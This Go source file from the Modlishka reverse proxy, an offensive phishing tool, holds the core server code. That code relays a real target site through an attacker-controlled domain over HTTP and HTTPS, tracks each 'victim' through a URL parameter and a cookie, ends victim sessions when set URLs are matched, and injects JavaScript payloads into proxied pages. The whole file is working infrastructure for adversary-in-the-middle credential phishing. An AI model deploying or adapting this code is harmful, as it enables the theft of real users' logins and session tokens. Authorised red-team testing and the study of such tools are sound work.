/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package core

import "C"
import (
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"

	"github.com/drk1wi/Modlishka/config"
	"github.com/drk1wi/Modlishka/log"
	"github.com/drk1wi/Modlishka/plugin"
	"github.com/drk1wi/Modlishka/runtime"
)

var ServerRuntimeConfig *ServerConfig

type ServerConfig struct {
	config.Options
	Handler *http.ServeMux
	Port    string
}

type EmbeddedServer struct {
	http.Server
	WebServerCertificate     string
	WebServerKey             string
	WebServerCertificatePool string
}

func (conf *ServerConfig) MainHandler(w http.ResponseWriter, r *http.Request) {

	// Patch the FQDN
	targetDomain, newTLS, TLSvalue := runtime.TranslateRequestHost(r.Host)

	// Replace the target domain based on path rules
	for path, domain := range runtime.ReplacePathHosts {
		if strings.Contains(r.URL.Path, path) {
			targetDomain = domain
			break
		}
	}

	if !*conf.DisableSecurity && runtime.IsValidRequestHost(r.Host, runtime.ProxyDomain) == false {
		log.Infof("Redirecting client to %s", runtime.TopLevelDomain)
		Redirect(w, r, "")
		return
	}
	if !*conf.DisableSecurity && len(targetDomain) > 0 && runtime.IsRejectedDomain(targetDomain) == true {
		log.Infof("Redirecting client to %s", runtime.TopLevelDomain)
		Redirect(w, r, "")
		return
	}

	// Check if the session should be terminated
	if _, err := r.Cookie(runtime.TERMINATE_SESSION_COOKIE_NAME); err == nil {
		if len(*conf.TerminateRedirectUrl) > 0 {
			log.Infof("Session terminated; Redirecting client to %s", *conf.TerminateRedirectUrl)
			Redirect(w, r, *conf.TerminateRedirectUrl)
		} else {
			log.Infof("Session terminated; Redirecting client to %s", runtime.TopLevelDomain)
			Redirect(w, r, "")
		}
		return
	}

	// Do a redirect when tracking cookie was already set . We want to get rid of the TrackingParam from the URL!
	queryString := r.URL.Query()
	if uid1, ok := queryString[runtime.TrackingParam]; ok {
		if uid2, err := r.Cookie(runtime.TrackingCookie); err == nil && uid1[0] == uid2.Value {
			delete(queryString, runtime.TrackingParam)
			r.URL.RawQuery = queryString.Encode()
			log.Infof("User tracking: Redirecting client to %s", r.URL.String())
			Redirect(w, r, r.URL.String())
		}
	}

	targetURL := ""

	if (runtime.ForceHTTP == true || runtime.ForceHTTPS == true) && newTLS == true {

		if TLSvalue == false {
			targetURL = "http://" + targetDomain
		} else {
			targetURL = "https://" + targetDomain
		}

	} else {

		if r.TLS != nil {
			targetURL = "https://" + targetDomain
		} else {
			targetURL = "http://" + targetDomain
		}
	}

	log.Debugf("[P] Proxying target [%s] via domain [%s]", targetURL, runtime.ProxyDomain)

	origin := r.Header.Get("Origin")

	settings := &ReverseProxyFactorySettings{
		conf.Options,
		targetURL,
		r.Host,
		origin,
		false,
	}

	if r.TLS != nil {
		settings.IsTLS = true
	}

	reverseProxy := settings.NewReverseProxy()

	if runtime.CheckTermination(r.Host + r.URL.String()) {
		log.Infof("[P] Time to terminate this victim! Termination URL matched: %s", r.Host+r.URL.String())
		reverseProxy.Terminate = true
	}

	if reverseProxy.Origin != "" {
		log.Debugf("[P] ReverseProxy Origin: [%s]", reverseProxy.Origin)
	}

	//set up user tracking variables
	if val, ok := queryString[runtime.TrackingParam]; ok {
		reverseProxy.RequestContext.InitUserID = val[0]
		reverseProxy.RequestContext.UserID = val[0]
		log.Infof("[P] Tracking victim via initial parameter %s", val[0])
	} else if cookie, err := r.Cookie(runtime.TrackingCookie); err == nil {
		reverseProxy.RequestContext.UserID = cookie.Value
	}

	//check if JS Payload should be injected
	if payload := runtime.GetJSRulesPayload(r.Host + r.URL.String()); payload != "" {
		reverseProxy.Payload = payload
	}

	reverseProxy.Proxy.ServeHTTP(w, r)
}

func (es *EmbeddedServer) ListenAndServeTLS(addr string) error {

	c := &tls.Config{
		MinVersion: tls.VersionTLS10,
	}
	if es.TLSConfig != nil {
		*c = *es.TLSConfig
	}
	if c.NextProtos == nil {
		c.NextProtos = []string{"http/1.1"}
	}

	var err error
	c.Certificates = make([]tls.Certificate, 1)
	c.Certificates[0], err = tls.X509KeyPair([]byte(es.WebServerCertificate), []byte(es.WebServerKey))

	if es.WebServerCertificatePool != "" {
		certpool := x509.NewCertPool()
		if !certpool.AppendCertsFromPEM([]byte(es.WebServerCertificatePool)) {
			err := errors.New("ListenAndServeTLS: can't parse client certificate authority")
			log.Fatalf(err.Error() + " . Terminating.")
		}
		c.ClientCAs = certpool
	}

	c.PreferServerCipherSuites = true
	if err != nil {
		return err
	}

	conn, err := net.Listen("tcp", addr)
	if err != nil {
		return err
	}

	tlsListener := tls.NewListener(conn, c)
	return es.Serve(tlsListener)
}

func SetServerRuntimeConfig(conf config.Options) {

	ServerRuntimeConfig = &ServerConfig{
		Options: conf,
		Handler: http.NewServeMux(),
	}

}

func RunServer() {

	ServerRuntimeConfig.Handler.HandleFunc("/", ServerRuntimeConfig.MainHandler)

	plugin.RegisterHandler(ServerRuntimeConfig.Handler)

	var listener = string(*ServerRuntimeConfig.ListeningAddress)
	var portHTTP = strconv.Itoa(*ServerRuntimeConfig.ListeningPortHTTP)
	var portHTTPS = strconv.Itoa(*ServerRuntimeConfig.ListeningPortHTTPS)

	welcome := fmt.Sprintf(`
%s

>>>> "Modlishka" Reverse Proxy started - v.1.1 <<<<
Author: Piotr Duszynski @drk1wi  
`, runtime.Banner)

	if *ServerRuntimeConfig.ForceHTTP {

		var httplistener = listener + ":" + portHTTP
		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via --> [http://%s]", welcome, httplistener, runtime.Target, runtime.ProxyDomain)
		log.Infof("%s", welcome)

		server := &http.Server{Addr: httplistener, Handler: ServerRuntimeConfig.Handler}

		if err := server.ListenAndServe(); err != nil {
			log.Fatalf("%s . Terminating.", err)
		}

	} else if *ServerRuntimeConfig.ForceHTTPS {

		embeddedTLSServer := &EmbeddedServer{
			WebServerCertificate:     *ServerRuntimeConfig.TLSCertificate,
			WebServerKey:             *ServerRuntimeConfig.TLSKey,
			WebServerCertificatePool: *ServerRuntimeConfig.TLSPool,
		}

		embeddedTLSServer.Handler = ServerRuntimeConfig.Handler

		var httpslistener = listener + ":" + portHTTPS

		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.ProxyDomain)

		log.Infof("%s", welcome)

		err := embeddedTLSServer.ListenAndServeTLS(httpslistener)
		if err != nil {
			log.Fatalf(err.Error() + " . Terminating.")
		}

	} else { //default mode

		embeddedTLSServer := &EmbeddedServer{
			WebServerCertificate:     *ServerRuntimeConfig.TLSCertificate,
			WebServerKey:             *ServerRuntimeConfig.TLSKey,
			WebServerCertificatePool: *ServerRuntimeConfig.TLSPool,
		}

		embeddedTLSServer.Handler = ServerRuntimeConfig.Handler

		var HTTPServerRuntimeConfig = &ServerConfig{
			Options: ServerRuntimeConfig.Options,
			Handler: ServerRuntimeConfig.Handler,
			Port:    portHTTP,
		}

		var httpslistener = listener + ":" + portHTTPS
		var httplistener = listener + ":" + portHTTP

		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTPS [%s] via [https://%s]", welcome, httpslistener, runtime.Target, runtime.ProxyDomain)
		welcome = fmt.Sprintf("%s\nListening on [%s]\nProxying HTTP [%s] via [http://%s]", welcome, httplistener, runtime.Target, runtime.ProxyDomain)

		log.Infof("%s", welcome)

		if len(runtime.StaticLocations) > 0 {
			log.Infof("Maintained Location Header Targets: %s", strings.Join(runtime.StaticLocations, ", "))
		}

		go func() {
			server := &http.Server{Addr: httplistener, Handler: HTTPServerRuntimeConfig.Handler}
			if err := server.ListenAndServe(); err != nil {
				log.Fatalf("%s . Terminating.", err)
			}
		}()

		err := embeddedTLSServer.ListenAndServeTLS(httpslistener)
		if err != nil {
			log.Fatalf(err.Error() + " . Terminating.")
		}

	}
}
